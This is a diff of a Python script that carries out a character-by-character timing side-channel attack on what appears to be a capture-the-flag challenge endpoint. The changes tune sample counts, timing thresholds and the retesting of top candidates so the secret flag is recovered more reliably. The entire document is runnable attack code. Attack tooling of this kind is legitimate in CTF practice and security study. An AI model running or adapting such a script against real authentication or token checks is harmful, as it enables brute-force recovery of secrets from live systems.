@@ -6,16 +6,18 @@ import statistics
 URL = "https://sofia-challenge.vercel.app/api/validate"
 
 CHARSET = string.ascii_uppercase + string.digits + "_{}"
-INITIAL_ATTEMPTS = 8      # Initial screening
-RETEST_ATTEMPTS = 15      # When signal is weak
-CONFIDENCE_THRESHOLD = 0.045  # 45ms minimum difference to trust result
+INITIAL_ATTEMPTS = 10     # More initial samples
+RETEST_ATTEMPTS = 20      # Even more for retesting
+MIN_DIFF_MS = 60          # Minimum 60ms difference to trust (adjusted for 100ms delay)
 
 recovered = ""
 
-print("[*] Starting timing attack with smart backtracking...\n")
+print("[*] Starting hybrid timing attack...\n")
+print(f"[*] Server delay: 100ms per correct character")
+print(f"[*] Minimum difference threshold: {MIN_DIFF_MS}ms\n")
 
 def test_character(guess, attempts):
-    """Test a guess multiple times and return median time"""
+    """Test a guess multiple times and return statistics"""
     times = []
     for _ in range(attempts):
         start = time.perf_counter()
@@ -25,93 +27,105 @@ def test_character(guess, attempts):
             continue
         times.append(time.perf_counter() - start)
     
-    return statistics.median(times) if times else 0
+    if not times:
+        return None, None
+    
+    return statistics.median(times), statistics.stdev(times) if len(times) > 1 else 0
 
-def check_if_complete(flag):
-    """Check if we've found the complete flag"""
+def check_flag_status(flag):
+    """Check the status of current flag"""
     try:
         r = requests.post(URL, json={"flag": flag}, timeout=10)
         data = r.json()
-        return data.get("status") == "success"
+        return data.get("status")
     except Exception:
-        return False
+        return None
 
 while True:
-    print(f"{'='*60}")
-    print(f"Current progress: {recovered if recovered else '(empty)'}")
-    print(f"{'='*60}\n")
+    print(f"{'='*70}")
+    print(f"Current: '{recovered}' (length: {len(recovered)})")
+    print(f"{'='*70}\n")
+    
+    # Phase 1: Screen all characters
+    print(f"[Phase 1] Testing all {len(CHARSET)} characters ({INITIAL_ATTEMPTS} attempts each)...\n")
     
     timings = {}
-    
-    # Phase 1: Initial screening of all characters
-    print("[Phase 1] Screening all characters...")
-    for ch in CHARSET:
+    for i, ch in enumerate(CHARSET, 1):
         guess = recovered + ch
-        median_time = test_character(guess, INITIAL_ATTEMPTS)
-        timings[ch] = median_time
-        print(f"  {guess:<30} -> {median_time:.4f}s")
+        median, stdev = test_character(guess, INITIAL_ATTEMPTS)
+        
+        if median is None:
+            continue
+            
+        timings[ch] = median
+        
+        # Progress indicator
+        if i % 10 == 0:
+            print(f"  Progress: {i}/{len(CHARSET)} tested...")
     
     if not timings:
         print("\n[!] No successful requests — stopping.")
         break
     
-    # Sort by timing (slowest first)
+    # Sort by timing
     sorted_chars = sorted(timings.items(), key=lambda x: x[1], reverse=True)
     
-    print("\n[Top 5 Candidates]")
+    print(f"\n[Top 5 Candidates by Timing]")
     for i, (ch, t) in enumerate(sorted_chars[:5], 1):
-        print(f"  {i}. '{ch}' -> {t:.4f}s")
+        diff = (t - sorted_chars[1][1]) * 1000 if i == 1 else (t - sorted_chars[0][1]) * 1000
+        print(f"  {i}. '{ch}' -> {t:.4f}s (diff: {abs(diff):+.1f}ms)")
     
     best_char, best_time = sorted_chars[0]
-    second_time = sorted_chars[1][1]
-    time_diff = best_time - second_time
+    second_char, second_time = sorted_chars[1]
+    time_diff_ms = (best_time - second_time) * 1000
     
-    print(f"\nTime difference: {time_diff*1000:.1f}ms")
+    print(f"\nGap between #1 and #2: {time_diff_ms:.1f}ms")
     
-    # Phase 2: If signal is weak, retest top candidates
-    if time_diff < CONFIDENCE_THRESHOLD:
-        print(f"\n[⚠️] Weak signal detected! Retesting top 3 with more samples...")
+    # Phase 2: Smart decision making
+    if time_diff_ms < MIN_DIFF_MS:
+        print(f"\n[⚠️] Gap < {MIN_DIFF_MS}ms — Retesting top 3 with {RETEST_ATTEMPTS} samples...\n")
         
-        retest_timings = {}
+        retest_results = {}
         for ch, _ in sorted_chars[:3]:
             guess = recovered + ch
-            median_time = test_character(guess, RETEST_ATTEMPTS)
-            retest_timings[ch] = median_time
-            print(f"  {guess:<30} -> {median_time:.4f}s ({RETEST_ATTEMPTS} samples)")
+            median, stdev = test_character(guess, RETEST_ATTEMPTS)
+            retest_results[ch] = median
+            print(f"  '{ch}': {median:.4f}s (stdev: {stdev:.4f}s)")
         
-        # Re-sort based on retest
-        sorted_retest = sorted(retest_timings.items(), key=lambda x: x[1], reverse=True)
+        # Re-evaluate
+        sorted_retest = sorted(retest_results.items(), key=lambda x: x[1], reverse=True)
         best_char = sorted_retest[0][0]
         best_time = sorted_retest[0][1]
         second_time = sorted_retest[1][1]
-        time_diff = best_time - second_time
+        time_diff_ms = (best_time - second_time) * 1000
         
-        print(f"\n[Retest Results]")
-        print(f"  Winner: '{best_char}' ({best_time:.4f}s)")
-        print(f"  Difference: {time_diff*1000:.1f}ms")
+        print(f"\n[Retest Winner] '{best_char}' with {time_diff_ms:.1f}ms advantage")
         
-        if time_diff < 0.030:  # Still weak after retest
-            print(f"\n[⚠️] Still ambiguous! Trying anyway...")
+        if time_diff_ms < 40:
+            print(f"[⚠️] Still weak signal — proceeding with best guess")
     else:
-        print(f"\n[✓] Strong signal - confident in result")
+        print(f"[✓] Strong signal — confident in '{best_char}'")
     
-    # Add the best character
+    # Add character
     recovered += best_char
-    print(f"\n[+] Added '{best_char}' -> Current: {recovered}")
+    print(f"\n[+] Added '{best_char}'\n")
     
-    # Check if complete
-    if check_if_complete(recovered):
-        print(f"\n{'='*60}")
-        print(f"🎉 FLAG FOUND: {recovered}")
-        print(f"{'='*60}")
+    # Verify status
+    status = check_flag_status(recovered)
+    
+    if status == "success":
+        print(f"{'='*70}")
+        print(f"🎉 COMPLETE FLAG: {recovered}")
+        print(f"{'='*70}")
         break
+    elif status == "partial":
+        print(f"[✓] Correct so far, continuing...\n")
+    elif status == "error":
+        print(f"[?] Server says error, but continuing...\n")
     
     # Safety limit
     if len(recovered) > 30:
-        print("\n[!] Flag length exceeded 30 characters, stopping.")
-        print(f"Recovered: {recovered}")
+        print("\n[!] Exceeded max length, stopping.")
         break
-    
-    print()  # Blank line before next iteration
 
-print(f"\nFinal result: {recovered}")
+print(f"\n[Final] {recovered}")
